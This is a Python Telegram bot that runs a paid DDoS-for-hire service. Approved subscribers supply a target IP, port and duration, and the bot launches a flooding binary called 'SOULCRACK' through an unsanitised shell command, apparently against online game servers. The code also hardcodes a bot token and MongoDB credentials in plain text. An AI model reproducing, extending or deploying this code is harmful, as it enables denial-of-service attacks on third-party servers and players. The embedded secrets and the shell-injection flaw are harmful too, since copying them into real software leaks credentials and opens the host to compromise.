import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import random
from subprocess import Popen
from threading import Thread
import asyncio
import aiohttp
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

loop = asyncio.get_event_loop()

TOKEN = '7466203157:AAGBimvC0tlTatDyEFNMry_FuenT7NpIXaU'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002224578899
CHANNEL_ID = -1002224578899
error_channel_id = -1002224578899

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

async def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    await start_asyncio_loop()

def update_proxy():
    proxy_list = [
        "https://80.78.23.49:1080"
    ]
    proxy = random.choice(proxy_list)
    telebot.apihelper.proxy = {'https': proxy}
    logging.info("Proxy updated successfully.")

@bot.message_handler(commands=['update_proxy'])
def update_proxy_command(message):
    chat_id = message.chat.id
    try:
        update_proxy()
        bot.send_message(chat_id, "Proxy updated successfully.")
    except Exception as e:
        bot.send_message(chat_id, f"Failed to update proxy: {e}")

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./SOULCRACK {target_ip} {target_port} {duration}")
    await process.communicate()
    bot.attack_in_progress = False

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*🚫 Access Denied!*\n"
                                   "*You don't have permission to use this command.*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*⚠️ Hold on! Invalid command format.*\n"
                                   "*Please use one of the following commands:*\n"
                                   "*1. /approve <user_id> <plan> <days>*\n"
                                   "*2. /disapprove <user_id>*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    target_username = message.reply_to_message.from_user.username if message.reply_to_message else None
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:  # Instant Plan 🧡
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*🚫 Approval Failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                return
        elif plan == 2:  # Instant++ Plan 💥
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*🚫 Approval Failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"user_id": target_user_id, "username": target_username, "plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = (f"*🎉 Congratulations!*\n"
                    f"*User {target_user_id} has been approved!*\n"
                    f"*Plan: {plan} for {days} days!*\n"
                    f"*Welcome to our community! Let’s make some magic happen! ✨*")
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = (f"*❌ Disapproval Notice!*\n"
                    f"*User {target_user_id} has been disapproved.*\n"
                    f"*They have been reverted to free access.*\n"
                    f"*Encourage them to try again soon! 🍀*")

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')



# Initialize attack flag, duration, and start time
bot.attack_in_progress = False
bot.attack_duration = 0  # Store the duration of the ongoing attack
bot.attack_start_time = 0  # Store the start time of the ongoing attack

@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        user_data = users_collection.find_one({"user_id": user_id})
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       "*You need to be approved to use this bot.*\n"  # Need approval message
                                       "*Contact the owner for assistance: @NSG_RAJESH.*", parse_mode='Markdown')  # Contact owner message
            return

        # Check plan limits
        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "*🧡 Instant Plan is currently full!* \n"  # Instant Plan full message
                                       "*Please consider upgrading for priority access.*", parse_mode='Markdown')  # Upgrade message
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "*💥 Instant++ Plan is currently full!* \n"  # Instant++ Plan full message
                                       "*Consider upgrading or try again later.*", parse_mode='Markdown')  # Upgrade message
            return

        if bot.attack_in_progress:
            bot.send_message(chat_id, "*⚠️ Please wait!*\n"  # Busy message
                                       "*The bot is busy with another attack.*\n"  # Current attack message
                                       "*Check remaining time with the /when command.*", parse_mode='Markdown')  # Check remaining time
            return

        bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"  # Ready to launch message
                                   "*Please provide the target IP, port, and duration in seconds.*\n"  # Provide details message
                                   "*Example: 167.67.25 6296 60* 🔥\n"  # Example message
                                   "*Let the chaos begin! 🎉*", parse_mode='Markdown')  # Start chaos message
        bot.register_next_step_handler(message, process_attack_command)

    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❗ Error!*\n"  # Error message
                                               "*Please use the correct format and try again.*\n"  # Correct format message
                                               "*Make sure to provide all three inputs! 🔄*", parse_mode='Markdown')  # Three inputs message
            return

        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*🔒 Port {target_port} is blocked.*\n"  # Blocked port message
                                               "*Please select a different port to proceed.*", parse_mode='Markdown')  # Different port message
            return
        if duration >= 600:
            bot.send_message(message.chat.id, "*⏳ Maximum duration is 599 seconds.*\n"  # Duration limit message
                                               "*Please shorten the duration and try again!*", parse_mode='Markdown')  # Shorten duration message
            return  

        bot.attack_in_progress = True  # Mark that an attack is in progress
        bot.attack_duration = duration  # Store the duration of the ongoing attack
        bot.attack_start_time = time.time()  # Record the start time

        # Start the attack
        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*🚀 Attack Launched! 🚀*\n\n"  # Attack launched message
                                           f"*📡 Target Host: {target_ip}*\n"  # Target host message
                                           f"*👉 Target Port: {target_port}*\n"  # Target port message
                                           f"*⏰ Duration: {duration} seconds! Let the chaos unfold! 🔥*", parse_mode='Markdown')  # Duration message

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")





def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['when'])
def when_command(message):
    chat_id = message.chat.id
    if bot.attack_in_progress:
        elapsed_time = time.time() - bot.attack_start_time  # Calculate elapsed time
        remaining_time = bot.attack_duration - elapsed_time  # Calculate remaining time

        if remaining_time > 0:
            bot.send_message(chat_id, f"*⏳ Time Remaining: {int(remaining_time)} seconds...*\n"
                                       "*🔍 Hold tight, the action is still unfolding!*\n"
                                       "*💪 Stay tuned for updates!*", parse_mode='Markdown')
        else:
            bot.send_message(chat_id, "*🎉 The attack has successfully completed!*\n"
                                       "*🚀 You can now launch your own attack and showcase your skills!*", parse_mode='Markdown')
    else:
        bot.send_message(chat_id, "*❌ No attack is currently in progress!*\n"
                                   "*🔄 Feel free to initiate your attack whenever you're ready!*", parse_mode='Markdown')


@bot.message_handler(commands=['myinfo'])
def myinfo_command(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})

    if not user_data:
        # User not found in the database
        response = "*❌ Oops! No account information found!* \n"  # Account not found message
        response += "*For assistance, please contact the owner: @NSG_RAJESH* "  # Contact owner message
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
        response += "*Please reach out to the owner for assistance: @NSG_RAJESH* 🙏"  # Contact owner message
    else:
        # User found and approved
        username = message.from_user.username or "Unknown User"  # Default username if none provided
        plan = user_data.get('plan', 'N/A')  # Get user plan
        valid_until = user_data.get('valid_until', 'N/A')  # Get validity date
        current_time = datetime.now().isoformat()  # Get current time
        response = (f"*👤 USERNAME: @{username}* \n"  # Username
                    f"*💸 PLAN: {plan}* \n"  # User plan
                    f"*⏳ VALID UNTIL: {valid_until}* \n"  # Validity date
                    f"*⏰ CURRENT TIME: {current_time}* \n"  # Current time
                    f"*🌟 Thank you for being an important part of our community! If you have any questions or need help, just ask! We’re here for you!* 💬🤝")  # Community message

    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['rules'])
def rules_command(message):
    rules_text = (
        "*📜 Bot Rules - Keep It Cool!\n\n"
        "1. No spamming attacks! ⛔ \nRest for 5-6 matches between DDOS.\n\n"
        "2. Limit your kills! 🔫 \nStay under 30-40 kills to keep it fair.\n\n"
        "3. Play smart! 🎮 \nAvoid reports and stay low-key.\n\n"
        "4. No mods allowed! 🚫 \nUsing hacked files will get you banned.\n\n"
        "5. Be respectful! 🤝 \nKeep communication friendly and fun.\n\n"
        "6. Report issues! 🛡️ \nMessage TO Owner for any problems.\n\n"
        "💡 Follow the rules and let’s enjoy gaming together!*"
    )

    try:
        bot.send_message(message.chat.id, rules_text, parse_mode='Markdown')
    except Exception as e:
        print(f"Error while processing /rules command: {e}")

    except Exception as e:
        print(f"Error while processing /rules command: {e}")


@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = ("*🌟 Welcome to the Ultimate Command Center!*\n\n"
                 "*Here’s what you can do:* \n"
                 "1. *`/attack` - ⚔️ Launch a powerful attack and show your skills!*\n"
                 "2. *`/myinfo` - 👤 Check your account info and stay updated.*\n"
                 "3. *`/owner` - 📞 Get in touch with the mastermind behind this bot!*\n"
                 "4. *`/when` - ⏳ Curious about the bot's status? Find out now!*\n"
                 "5. *`/canary` - 🦅 Grab the latest Canary version for cutting-edge features.*\n"
                 "6. *`/rules` - 📜 Review the rules to keep the game fair and fun.*\n\n"
                 "*💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!*")

    try:
        bot.send_message(message.chat.id, help_text, parse_mode='Markdown')
    except Exception as e:
        print(f"Error while processing /help command: {e}")



@bot.message_handler(commands=['owner'])
def owner_command(message):
    response = (
        "*👤 **Owner Information:**\n\n"
        "For any inquiries, support, or collaboration opportunities, don't hesitate to reach out to the owner:\n\n"
        "📩 **Telegram:** @NSG_RAJESH\n\n"
        "💬 **We value your feedback!** Your thoughts and suggestions are crucial for improving our service and enhancing your experience.\n\n"
        "🌟 **Thank you for being a part of our community!** Your support means the world to us, and we’re always here to help!*\n"
    )
    bot.send_message(message.chat.id, response, parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*🌍 WELCOME TO DDOS WORLD!* 🎉\n\n"
                                           "*🚀 Get ready to dive into the action!*\n\n"
                                           "*💣 To unleash your power, use the* `/attack` *command followed by your target's IP and port.* ⚔️\n\n"
                                           "*🔍 Example: After* `/attack`, *enter:* `ip port duration`.\n\n"
                                           "*🔥 Ensure your target is locked in before you strike!*\n\n"
                                           "*📚 New around here? Check out the* `/help` *command to discover all my capabilities.* 📜\n\n"
                                           "*⚠️ Remember, with great power comes great responsibility! Use it wisely... or let the chaos reign!* 😈💥", 
                                           parse_mode='Markdown')
    except Exception as e:
        print(f"Error while processing /start command: {e}")


if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
